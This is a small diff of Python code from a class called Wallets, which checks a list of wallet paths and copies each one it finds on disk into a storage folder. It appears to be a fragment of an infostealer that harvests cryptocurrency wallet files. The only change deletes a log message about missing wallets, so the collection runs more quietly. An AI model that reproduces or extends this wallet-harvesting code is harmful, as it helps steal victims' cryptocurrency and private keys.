@@ -30,7 +30,6 @@ class Wallets:
         for wallet in wallets:
 
             if not path.exists(wallet["path"]):
-                print(f'[Wallets]: No {wallet["name"]} found')
                 continue
 
             self.__storage.add_from_disk(wallet["path"], path.join(self.__folder, wallet["name"]))
